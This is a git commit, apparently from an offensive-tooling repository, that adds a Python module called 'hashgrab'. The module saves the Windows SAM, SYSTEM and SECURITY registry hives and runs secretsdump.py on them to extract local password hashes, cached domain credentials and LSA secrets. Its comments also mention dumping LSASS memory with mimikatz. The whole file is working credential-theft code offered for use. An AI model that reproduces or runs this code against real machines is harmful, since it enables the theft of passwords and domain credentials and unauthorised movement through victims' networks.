bfc4ff2579aabdb291fe6ff4e39f71df1548cf22
N0Sh33l <37156910+N0Sh33l@users.noreply.github.com>
2018-03-16 10:51:48 +0000

    Add files via upload

---
+++ modules/hashgrab.py
@@ -0,0 +1,46 @@
+# Local SAM Hashes
+
+# Cached Domain Credentials:
+#	These are the password hashes of domain users
+#	that have logged on to the host previously.
+
+# LSA Secrets:
+#	Here, you will find account passwords for services that are set to run under
+#	actual Windows user accounts (as opposed to Local System, Network Service and Local Service),
+#	the auto-logon password and more.
+#	If the Windows host is part of a domain, you will find the domain credentials of the machine
+#	account with which you can authenticate to the domain to list domain users and admins as well
+#	as browsing shares and so on.
+
+# In-Memory Credentials:
+#	Dump clear-text passwords from memory using mimikatz and the Windows Task Manager to dump the LSASS process.
+
+
+# Make copy of the system, security and sam hives 
+# Run secretsdump
+
+import os
+import subprocess
+import shlex
+import sys
+
+
+def save_registry():
+	os.system("reg save hklm\sam sam")
+	os.system("reg save hklm\system system")
+	os.system("reg save hklm\security security")
+
+def run():
+	# save_registry()
+	# output = os.popen('python secretsdump.py -sam sam -security security -system system LOCAL').read()
+	# my_path = os.path.abspath(__file__)
+	# mydir = os.path.dirname(my_path)
+	# start = os.path.join(mydir, "secretsdump.py")
+	# result = subprocess.call([sys.executable, start])
+	try:
+		result = subprocess.check_output("secretsdump.py -system system -sam sam -security security LOCAL",stderr=subprocess.STDOUT, shell=True)
+		return result
+	except subprocess.CalledProcessError as e:
+		raise RuntimeError("command {} return with error (code {}): {}".format(e.cmd, e.returncode, e.output))
+
+
